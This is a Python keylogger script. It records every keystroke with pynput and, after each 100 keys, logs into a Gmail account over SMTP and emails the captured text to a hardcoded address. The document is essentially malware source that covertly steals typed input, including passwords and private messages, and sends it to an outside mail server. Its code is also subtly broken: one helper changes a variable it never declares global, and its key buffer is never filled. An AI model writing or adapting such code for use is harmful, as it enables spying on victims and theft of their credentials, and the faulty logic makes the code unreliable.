import pynput
import smtplib
from datetime import datetime
from smtplib import SMTPException
from pynput.keyboard import Key, Listener

# Email information
# This is used to log into your gmail account to send an email
gmail_user = 'XXXXXX@gmail.com'
gmail_password = 'XXXXXXX'

count = 0
keys = []
log = ''

def on_press(key):
    global log, keys, count

    log += str(key)
    count += 1
    # After 100 characters send email
    if count >= 100:
        count = 0
        write_file(keys)
        keys = []
        # Send email
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            # Identify yourself to an ESMTP server using EHLO
            server.ehlo()
            # Put the SMTP connection in TLS (Transport Layer Security) mode
            server.starttls()
            server.ehlo()
            server.login(gmail_user, gmail_password)
            # sendmail(sent_from, to, email_text)
            now = datetime.now()
            html = """
                Date and Time: {}\n
                {}
            """.format(now, log)
            server.sendmail("Robsweny@gmail.com", "Robsweny@gmail.com", html)
            server.close()
            print("Mail Sent!")
        except:
            print("Error: issue connecting with mail client")

def on_release(key):
    if key == Key.esc:
        return False


def write_file(keys):
    for key in keys:
        k = str(key).replace("'","")
        if k.find("space") > 0:
            log += '\n'
        elif k.find("Key") == -1:
            log += str(k)


with Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join()